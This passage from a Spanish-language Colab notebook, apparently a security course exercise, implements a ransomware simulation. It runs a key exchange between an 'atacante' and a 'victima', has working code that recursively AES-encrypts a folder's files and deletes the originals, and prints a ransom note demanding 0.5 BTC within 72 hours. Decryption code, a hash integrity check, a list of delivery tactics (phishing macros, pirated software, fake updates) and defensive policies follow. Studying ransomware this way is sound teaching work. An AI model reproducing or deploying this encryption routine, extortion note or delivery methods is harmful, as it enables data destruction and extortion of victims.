        "id": "tpCMwyuZ0VVl"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Creacion de atacante y victima\n",
        "\n",
        "atacante=User()\n",
        "\n",
        "victima=User()"
      ],
      "metadata": {
        "id": "XiIzyqij02GA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "llave_corta_atacante=atacante.public_shortKey.export_key(format='DER')\n",
        "firma_pk_atacante=atacante.sign(llave_corta_atacante)\n",
        "print(\"Llave publica de corto plazo, firma y certificado del atacante enviados.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "omPa-u001CuA",
        "outputId": "9da832c4-7b6e-478d-90ca-84274f446324"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Llave publica de corto plazo, firma y certificado del atacante enviados.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Certificado valido\")\n",
        "certificado_atacante=atacante.certificado\n",
        "victima.validate_signature(certificado_atacante[\"public_key\"],llave_corta_atacante,firma_pk_atacante)\n",
        "k=get_random_bytes(128)\n",
        "certificado_victima=victima.certificado\n",
        "c=victima.encrypt(llave_corta_atacante,k+certificado_victima[\"id\"].encode())\n",
        "firma_pk_c_id_atacante=victima.sign(llave_corta_atacante+c+certificado_atacante[\"id\"].encode())\n",
        "print(\"Texto cifrado, firma y cetificado enviado.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "04_ya4b3SWuM",
        "outputId": "860d3517-4333-4499-ebd8-e194ada2bba5"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Certificado valido\n",
            "Firma valida\n",
            "Texto cifrado, firma y cetificado enviado.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Certificado valido\")\n",
        "atacante.validate_signature(certificado_victima['public_key'],llave_corta_atacante+c+certificado_atacante[\"id\"].encode(),firma_pk_c_id_atacante)\n",
        "m=atacante.decrypt(c)\n",
        "if(m==k+certificado_victima[\"id\"].encode()):\n",
        "  print(\"Intercambio de llaves\")\n",
        "else:\n",
        "  raise ValueError(\"Mensaje incorrecto\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TqzVGL5Cwv0d",
        "outputId": "fe3d60a7-6d88-413f-fd4c-7a958af9f89f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Certificado valido\n",
            "Firma valida\n",
            "Intercambio de llaves\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Generacion de llave simetrica y cifrado de archivos"
      ],
      "metadata": {
        "id": "mhJdGzlz8zl-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def derive_key(secret, salt=None):\n",
        "    if not salt:\n",
        "        salt = get_random_bytes(16)\n",
        "    key = PBKDF2(secret, salt, dkLen=32, count=1000000, hmac_hash_module=SHA256)\n",
        "    return key, salt"
      ],
      "metadata": {
        "id": "cBdhCpKs8-BZ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "cipher_key,salt=derive_key(k)\n",
        "print(f\"la llave generada es {cipher_key.hex()}, con la salt {salt.hex()}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xQVICSMYATmo",
        "outputId": "7e1fb342-e335-46bf-b853-be058ba3c788"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "la llave generada es 92bf1a6413e68e90d0a0072974bae533adccd9ef976d23548e03eafb47b7dc92, con la salt 3d5b03083f914ba4af2137f8f218e514\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def encrypt_block(block,key,iv):\n",
        "  cipher=AES.new(key,AES.MODE_CBC,iv)\n",
        "  return cipher.encrypt(pad(block,AES.block_size))\n",
        "\n",
        "def encrypt_file(file_path, key, block_size=64 * 1024):\n",
        "  iv=get_random_bytes(16)\n",
        "  with open(file_path,'rb') as f:\n",
        "    with open(file_path+\".enc\",'wb') as f_enc:\n",
        "      f_enc.write(iv)\n",
        "      while True:\n",
        "        block=f.read(block_size)\n",
        "        if len(block) == 0:\n",
        "          break\n",
        "        f_enc.write(encrypt_block(block, key, iv))\n",
        "\n",
        "  os.remove(file_path)\n",
        "\n",
        "def encrypt_files_in_path(path, key):\n",
        "  files_enc=[]\n",
        "  for root, dirs, files in os.walk(path):\n",
        "      for file in files:\n",
        "          file_path = os.path.join(root, file)\n",
        "          encrypt_file(file_path, key)\n",
        "          print(f\"Archivo {file_path} cifrado.\")\n",
        "          files_enc.append(file_path)\n",
        "\n",
        "  return files_enc\n",
        "\n"
      ],
      "metadata": {
        "id": "xCtIkiVXKflU"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "path_to_encrypt=\"/content/sample_data/\"\n",
        "archivos_encriptados=encrypt_files_in_path(path_to_encrypt,cipher_key)"
      ],
      "metadata": {
        "id": "SeuewbP80nvv",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "94add435-1c33-4943-dd3a-fe23f2aad358"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archivo /content/sample_data/README.md cifrado.\n",
            "Archivo /content/sample_data/anscombe.json cifrado.\n",
            "Archivo /content/sample_data/california_housing_train.csv cifrado.\n",
            "Archivo /content/sample_data/california_housing_test.csv cifrado.\n",
            "Archivo /content/sample_data/mnist_test.csv cifrado.\n",
            "Archivo /content/sample_data/mnist_train_small.csv cifrado.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Notificacion de Ataque"
      ],
      "metadata": {
        "id": "F04sM88r0LG_"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "message=f\"\"\"\n",
        "    ATENCIÓN: SUS ARCHIVOS HAN SIDO CIFRADOS\n",
        "\n",
        "    Estimado usuario,\n",
        "\n",
        "    Lamentamos informarle que todos sus archivos importantes han sido cifrados utilizando un algoritmo de cifrado fuerte y seguro. La lista de archivos cifrados incluye, pero no se limita a, los siguientes:\n",
        "\n",
        "    {\"\".join(f\"{file},\" for file in archivos_encriptados)}\n",
        "\n",
        "    Todos estos archivos extraidos de la carpeta {path_to_encrypt}\n",
        "\n",
        "    Para recuperar sus archivos, deberá realizar un pago de 0.5 BTC (Bitcoin) a la siguiente dirección de Bitcoin: 156UGALjatSQnY7wy4LruP6CEE5VoczdZE.\n",
        "\n",
        "    Una vez realizado el pago, envíe el comprobante de la transacción a correo@example.com . Le proporcionaremos la llave y las instrucciones necesarias para descifrar sus archivos.\n",
        "\n",
        "    Instrucciones para el pago en Bitcoin:\n",
        "    1. Acceda a su billetera Bitcoin o cree una si aún no tiene una.\n",
        "    2. Envíe el monto exacto de 0.5 BTC a la dirección 156UGALjatSQnY7wy4LruP6CEE5VoczdZE.\n",
        "    3. Guarde el comprobante de la transacción.\n",
        "    4. Envíe un correo electrónico a correo@example.com con el comprobante adjunto.\n",
        "\n",
        "    Advertencia:\n",
        "    - No intente descifrar los archivos usted mismo, ya que esto podría causar la pérdida permanente de sus datos.\n",
        "    - El pago debe realizarse en el plazo de 72 horas, de lo contrario, la llave de descifrado se eliminará permanentemente y sus archivos se perderán para siempre.\n",
        "\n",
        "    Atentamente,\n",
        "\n",
        "    Su encriptador.\n",
        "    \"\"\""
      ],
      "metadata": {
        "id": "JnXSDr0E1Lp2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(message)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "collapsed": true,
        "id": "rkBgrxIl0UaT",
        "outputId": "a35dd895-9300-45e3-f623-9fd1fd717786"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "    ATENCIÓN: SUS ARCHIVOS HAN SIDO CIFRADOS\n",
            "\n",
            "    Estimado usuario,\n",
            "\n",
            "    Lamentamos informarle que todos sus archivos importantes han sido cifrados utilizando un algoritmo de cifrado fuerte y seguro. La lista de archivos cifrados incluye, pero no se limita a, los siguientes:\n",
            "\n",
            "    /content/sample_data/README.md,/content/sample_data/anscombe.json,/content/sample_data/california_housing_train.csv,/content/sample_data/california_housing_test.csv,/content/sample_data/mnist_test.csv,/content/sample_data/mnist_train_small.csv,\n",
            "\n",
            "    Todos estos archivos extraidos de la carpeta /content/sample_data/\n",
            "\n",
            "    Para recuperar sus archivos, deberá realizar un pago de 0.5 BTC (Bitcoin) a la siguiente dirección de Bitcoin: 156UGALjatSQnY7wy4LruP6CEE5VoczdZE.\n",
            "\n",
            "    Una vez realizado el pago, envíe el comprobante de la transacción a correo@example.com . Le proporcionaremos la llave y las instrucciones necesarias para descifrar sus archivos.\n",
            "\n",
            "    Instrucciones para el pago en Bitcoin:\n",
            "    1. Acceda a su billetera Bitcoin o cree una si aún no tiene una.\n",
            "    2. Envíe el monto exacto de 0.5 BTC a la dirección 156UGALjatSQnY7wy4LruP6CEE5VoczdZE.\n",
            "    3. Guarde el comprobante de la transacción.\n",
            "    4. Envíe un correo electrónico a correo@example.com con el comprobante adjunto.\n",
            "\n",
            "    Advertencia:\n",
            "    - No intente descifrar los archivos usted mismo, ya que esto podría causar la pérdida permanente de sus datos.\n",
            "    - El pago debe realizarse en el plazo de 72 horas, de lo contrario, la llave de descifrado se eliminará permanentemente y sus archivos se perderán para siempre.\n",
            "\n",
            "    Atentamente,\n",
            "\n",
            "    Su encriptador.\n",
            "    \n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Instrucciones de Descifrado"
      ],
      "metadata": {
        "id": "4vF_T2et23rw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "instructions = f\"\"\"\n",
        "    INSTRUCCIONES PARA DESCIFRAR SUS ARCHIVOS\n",
        "\n",
        "    Estimado usuario,\n",
        "\n",
        "    Hemos recibido su pago. A continuación, le proporcionamos las instrucciones para descifrar sus archivos.\n",
        "\n",
        "    1. Utilice el siguiente secreto común y la siguiente salt para generar su llave de descifrado:\n",
        "       Secreto Común: {k}\n",
        "       Salt: {salt}\n",
        "\n",
        "    2. Utilice la siguiente función en Python para generar la llave simétrica a partir del secreto común:\n",
        "       ```python\n",
        "       from Crypto.Protocol.KDF import PBKDF2\n",
        "       from Crypto.Hash import SHA256\n",
        "\n",
        "       def derive_key(secret, salt):\n",
        "        key = PBKDF2(secret, salt, dkLen=32, count=1000000, hmac_hash_module=SHA256)\n",
        "        return key\n",
        "       ```\n",
        "\n",
        "    3. Una vez que haya generado la llave, utilice la siguiente función para descifrar sus archivos:\n",
        "       ```python\n",
        "       from Crypto.Cipher import AES\n",
        "       from Crypto.Util.Padding import unpad\n",
        "\n",
        "       def decrypt_block(block, key, iv):\n",
        "           cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "           return unpad(cipher.decrypt(block), AES.block_size)\n",
        "\n",
        "       def decrypt_file(file_path, key, block_size=64 * 1024):\n",
        "           with open(file_path, 'rb') as f_enc:\n",
        "               with open(file_path[:-4], 'wb') as f:\n",
        "                   iv = f_enc.read(16)\n",
        "                   next_block = b''\n",
        "                   while True:\n",
        "                       block = f_enc.read(block_size + AES.block_size)\n",
        "                       if len(block) == 0:\n",
        "                           break\n",
        "                       elif next_block:\n",
        "                           f.write(decrypt_block(next_block, key, iv))\n",
        "                       next_block = block\n",
        "                   f.write(decrypt_block(next_block, key, iv))\n",
        "       ```\n",
        "\n",
        "    4. Descifre cada uno de los archivos cifrados utilizando la llave generada y las funciones proporcionadas.\n",
        "\n",
        "    Los archivos cifrados son :  {\"\".join(f\"{file},\" for file in archivos_encriptados)}\n",
        " \"\"\"\n"
      ],
      "metadata": {
        "id": "wKyqXGXE4Vql"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(instructions)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ogjdnT325mrL",
        "outputId": "544d55bf-c092-4630-f6e5-f5efccc54929",
        "collapsed": true
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "    INSTRUCCIONES PARA DESCIFRAR SUS ARCHIVOS\n",
            "\n",
            "    Estimado usuario,\n",
            "\n",
            "    Hemos recibido su pago. A continuación, le proporcionamos las instrucciones para descifrar sus archivos.\n",
            "\n",
            "    1. Utilice el siguiente secreto común y la siguiente salt para generar su llave de descifrado:\n",
            "       Secreto Común: b'3\\xaf\\xafW\\x8d\\xec\\x94\\xa1\"Z\\xa04\\xf0\\xa8\\xc8}\\xf6-Nv\\xd6\\xc2n\\xc1\\xc8\\xdb2%\\xd9\\xe1_f\\x9c\\xedF!^1\\x84\\\\j\\xdaW\\'\\x1f\\xe1\\xef\\x13I\\xcb`R\\x82;\\xfc\\x05\\xb8\\xb3<\\xcd;\\xc84R\\x9d\\x1c\\x11\\xf2\\x96\\x19\\xed\\x90S\\xfb}\\xee1@\\x9e\\x17\\x0cA\\x0f\\xa8\\xae\\xca*B\\xd3\\xe0\\xfc\\xb0FR\\x98\\xc7Q\\xe3\\x9es\\xbcX.\\xa3\\xe9\\x13\\xce~\\xd2\\xd1\\xb5/\\xdfP\\x00A-U\\x8a9\\xcd\\xbf#y\\xc2\\xee\\xa1\\xaa'\n",
            "       Salt: b'=[\\x03\\x08?\\x91K\\xa4\\xaf!7\\xf8\\xf2\\x18\\xe5\\x14'\n",
            "\n",
            "    2. Utilice la siguiente función en Python para generar la llave simétrica a partir del secreto común:\n",
            "       ```python\n",
            "       from Crypto.Protocol.KDF import PBKDF2\n",
            "       from Crypto.Hash import SHA256\n",
            "\n",
            "       def derive_key(secret, salt):\n",
            "        key = PBKDF2(secret, salt, dkLen=32, count=1000000, hmac_hash_module=SHA256)\n",
            "        return key\n",
            "       ```\n",
            "\n",
            "    3. Una vez que haya generado la llave, utilice la siguiente función para descifrar sus archivos:\n",
            "       ```python\n",
            "       from Crypto.Cipher import AES\n",
            "       from Crypto.Util.Padding import unpad\n",
            "\n",
            "       def decrypt_block(block, key, iv):\n",
            "           cipher = AES.new(key, AES.MODE_CBC, iv)\n",
            "           return unpad(cipher.decrypt(block), AES.block_size)\n",
            "\n",
            "       def decrypt_file(file_path, key, block_size=64 * 1024):\n",
            "           with open(file_path, 'rb') as f_enc:\n",
            "               with open(file_path[:-4], 'wb') as f:\n",
            "                   iv = f_enc.read(16)\n",
            "                   next_block = b''\n",
            "                   while True:\n",
            "                       block = f_enc.read(block_size + AES.block_size)\n",
            "                       if len(block) == 0:\n",
            "                           break\n",
            "                       elif next_block:\n",
            "                           f.write(decrypt_block(next_block, key, iv))\n",
            "                       next_block = block\n",
            "                   f.write(decrypt_block(next_block, key, iv))\n",
            "       ```\n",
            "\n",
            "    4. Descifre cada uno de los archivos cifrados utilizando la llave generada y las funciones proporcionadas.\n",
            "\n",
            "    Los archivos cifrados son :  /content/sample_data/README.md,/content/sample_data/anscombe.json,/content/sample_data/california_housing_train.csv,/content/sample_data/california_housing_test.csv,/content/sample_data/mnist_test.csv,/content/sample_data/mnist_train_small.csv,\n",
            " \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def decrypt_block(block, key, iv):\n",
        "  cipher=AES.new(key,AES.MODE_CBC,iv)\n",
        "  return unpad(cipher.decrypt(block),AES.block_size)\n",
        "\n",
        "def decrypt_file(file_path, key, block_size=64 * 1024):\n",
        "  with open(file_path,'rb') as f_enc:\n",
        "    with open(file_path[:-4],'wb') as f:\n",
        "      # block_size=block_size+(block_size%AES.block_size)\n",
        "      iv=f_enc.read(16)\n",
        "      next_block=b''\n",
        "      while True:\n",
        "        block=f_enc.read(block_size + AES.block_size)\n",
        "        if len(block)== 0:\n",
        "          break\n",
        "        elif next_block:\n",
        "          f.write(decrypt_block(next_block, key, iv))\n",
        "        next_block=block\n",
        "      f.write(decrypt_block(next_block, key, iv))\n",
        "\n",
        "  os.remove(file_path)\n",
        "\n",
        "def decrypt_files_in_path(path, key):\n",
        "  for root, dirs, files in os.walk(path):\n",
        "      for file in files:\n",
        "        if file.endswith('.enc'):\n",
        "          file_path = os.path.join(root, file)\n",
        "          decrypt_file(file_path, key)\n",
        "          print(f\"Archivo {file_path} descifrado.\")"
      ],
      "metadata": {
        "id": "ODAAcqeWNOhX"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "decrypt_files_in_path(\"/content/sample_data/\",cipher_key)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mmTp0IACXVsb",
        "outputId": "839d64da-2f48-4557-d8c3-07787d3d440a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archivo /content/sample_data/anscombe.json.enc descifrado.\n",
            "Archivo /content/sample_data/mnist_test.csv.enc descifrado.\n",
            "Archivo /content/sample_data/california_housing_train.csv.enc descifrado.\n",
            "Archivo /content/sample_data/california_housing_test.csv.enc descifrado.\n",
            "Archivo /content/sample_data/README.md.enc descifrado.\n",
            "Archivo /content/sample_data/mnist_train_small.csv.enc descifrado.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Verificacion de integridad de archivos"
      ],
      "metadata": {
        "id": "oIzRyCjaPTSZ"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Para verificar la integridad de los archivos que fueron afectados por el ransomware, se puede utilizar funciones hash.\n",
        "\n",
        "Es una estrategia común calcular el hash del archivo original antes de cifrarlo y almacenarlo. Luego, después de descifrar el archivo se vuelve a calcular el hash y se compara con el hash almacenado, si ambos hashes coinciden, la integridad del archivo está verificada."
      ],
      "metadata": {
        "id": "2NgEaDEWPj4-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def hash_file(path):\n",
        "  with open(path,'rb') as f:\n",
        "    content=f.read()\n",
        "\n",
        "  return SHA256.new(content).digest()\n",
        "\n",
        "def hash_files_in_path(path):\n",
        "  files_hashed={}\n",
        "  for root, dirs, files in os.walk(path):\n",
        "    for file in files:\n",
        "      file_path=os.path.join(root,file)\n",
        "      hashed_file=hash_file(file_path)\n",
        "      files_hashed[file_path]=hashed_file.hex()\n",
        "\n",
        "  return files_hashed"
      ],
      "metadata": {
        "id": "aDlk4dpSReXA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Se vuelve a cifrar y a descifrar los archivos para comprobar la integridad de estos\n",
        "\n",
        "# Aplicamos el hash a los archivos antes de cifrarlos\n",
        "\n",
        "hash_before_encrypt=hash_files_in_path(\"/content/sample_data\")\n",
        "\n",
        "encrypt_files_in_path(\"/content/sample_data\",cipher_key)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "collapsed": true,
        "id": "pTcAUnlWPeby",
        "outputId": "e1d066c4-5d18-4859-be34-a0bd5edcc95f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archivo /content/sample_data/README.md cifrado.\n",
            "Archivo /content/sample_data/anscombe.json cifrado.\n",
            "Archivo /content/sample_data/california_housing_train.csv cifrado.\n",
            "Archivo /content/sample_data/california_housing_test.csv cifrado.\n",
            "Archivo /content/sample_data/mnist_test.csv cifrado.\n",
            "Archivo /content/sample_data/mnist_train_small.csv cifrado.\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['/content/sample_data/README.md',\n",
              " '/content/sample_data/anscombe.json',\n",
              " '/content/sample_data/california_housing_train.csv',\n",
              " '/content/sample_data/california_housing_test.csv',\n",
              " '/content/sample_data/mnist_test.csv',\n",
              " '/content/sample_data/mnist_train_small.csv']"
            ]
          },
          "metadata": {},
          "execution_count": 27
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Ahora se descifran los archivos y se vuelven a hashear\n",
        "\n",
        "decrypt_files_in_path(\"/content/sample_data\",cipher_key)\n",
        "hash_after_decrypt=hash_files_in_path(\"/content/sample_data\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0nZ81cZOWFus",
        "outputId": "3b06f1e1-f8ee-4acf-dea6-ee52a794b4a0"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archivo /content/sample_data/anscombe.json.enc descifrado.\n",
            "Archivo /content/sample_data/mnist_test.csv.enc descifrado.\n",
            "Archivo /content/sample_data/california_housing_train.csv.enc descifrado.\n",
            "Archivo /content/sample_data/california_housing_test.csv.enc descifrado.\n",
            "Archivo /content/sample_data/README.md.enc descifrado.\n",
            "Archivo /content/sample_data/mnist_train_small.csv.enc descifrado.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def compare_hash(dict1, dict2):\n",
        "    for key in dict1:\n",
        "        if dict1[key] != dict2[key]:\n",
        "            print(f\"La integridad del archivo {key} fue comprometida.\")\n",
        "    print(\"Todos los archivos fueron analizados\")"
      ],
      "metadata": {
        "id": "-nJXwbJIWZ-n"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "compare_hash(hash_before_encrypt,hash_after_decrypt)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ntZVydR0XSmz",
        "outputId": "f154ecec-9f69-4b43-8d30-eb51a75b81ff"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Todos los archivos fueron analizados\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Preguntas"
      ],
      "metadata": {
        "id": "vVGz1xvmXl7m"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "**1. Asuman el rol del atacante. Imaginen que realizan una implementación\n",
        "funcional y real de su malware y lo convierten en un arma de ataque ¿Qué\n",
        "estrategias utilizarían para que la víctima lo instale en su máquina? Es decir,\n",
        "¿Cómo implementarían el paso 1 descrito en la operación?**\n",
        "\n",
        "Las estrategias que se pueden usar para llegar a instalar el malware en el dispositivo de la victima pueden ser:\n",
        "\n",
        "- Adjuntos Maliciosos en Correos Electrónicos (Phishing)\n",
        "Enviar archivos adjuntos infectados con macros maliciosas en documentos de Word, Excel, PDF, o archivos comprimidos (ZIP). Al abrir estos archivos y permitir la ejecución de macros, el malware se instalaría en el sistema de la víctima.\n",
        "\n",
        "- Software y Aplicaciones Piratas:\n",
        "Incluir el malware en copias piratas de software o aplicaciones populares. Los usuarios que descarguen e instalen estos programas piratas también instalarían el malware.\n",
        "\n",
        "- Actualizaciones de Software Falsas:\n",
        "Engañar a los usuarios para que descarguen e instalen actualizaciones falsas de software o sistemas operativos. Estas actualizaciones podrían aparecer como notificaciones emergentes en sus navegadores web o en correos electrónicos falsos.\n"
      ],
      "metadata": {
        "id": "y5odwkyPXrN0"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "**2. Asuman el rol del defensor. Describan políticas y prácticas para garantizar la\n",
        "confidencialidad, la integridad y la disponibilidad de recursos informáticos en una organización. En particular, estas políticas y prácticas deberían mitigar la ocurrencia de este tipo de ataques.**\n",
        "\n",
        "Las políticas y prácticas para garantizar la seguridad de los recursos informáticos en una organización encontrados fueron:\n",
        "\n",
        "### Confidencialidad\n",
        "\n",
        "- Control de Acceso: Utilizar controles basados en roles (RBAC) y autenticación multifactor (MFA) para asegurar que solo el personal autorizado acceda a información sensible.\n",
        "\n",
        "- Cifrado de Datos: Encriptar datos tanto en tránsito como en reposo con algoritmos fuertes. Gestionar y almacenar claves de cifrado de manera segura.\n",
        "\n",
        "- Políticas de Privacidad: Desarrollar políticas de privacidad para manejar y proteger la información sensible.\n",
        "\n",
        "### Integridad\n",
        "\n",
        "- Controles de Integridad de Datos: Emplear sumas de verificación y hashes para asegurar que los datos no se alteren. Implementar controles de versión y auditorías para rastrear cambios en datos y sistemas.\n",
        "\n",
        "- Software de Seguridad: Usar software antivirus y antimalware actualizado. Realizar análisis regulares de vulnerabilidades y aplicar parches de seguridad.\n",
        "\n",
        "- Políticas de Seguridad de Código: Adoptar prácticas seguras de desarrollo de software, como revisiones de código y pruebas de penetración.\n",
        "\n",
        "### Disponibilidad\n",
        "\n",
        "- Respaldo y Recuperación de Datos: Implementar estrategias de respaldo regular y fuera de sitio. Probar regularmente los planes de recuperación ante desastres.\n",
        "\n",
        "- Monitoreo y Respuesta a Incidentes: Establecer un sistema de monitoreo continuo y un plan de respuesta a incidentes. Practicar procedimientos para contener y mitigar ataques.\n",
        "\n",
        "- Redundancia y Alta Disponibilidad: Implementar soluciones de alta disponibilidad y redundancia. Utilizar balanceadores de carga y configuraciones de failover.\n",
        "\n",
        "### Mitigación de Ataques Específicos\n",
        "\n",
        "- Concienciación y Capacitación del Personal: Proveer formación en seguridad cibernética y simular ataques de phishing.\n",
        "\n",
        "- Políticas de Uso Aceptable: Desarrollar políticas claras sobre el uso de recursos informáticos y gestionar dispositivos móviles (MDM).\n",
        "\n",
        "- Revisión y Actualización Regular de Políticas de Seguridad: Revisar y actualizar políticas de seguridad regularmente. Realizar auditorías de seguridad y evaluaciones de riesgos periódicamente.\n"
      ],
      "metadata": {
        "id": "aK0DKbFkXzXi"
      }
    }
  ]
}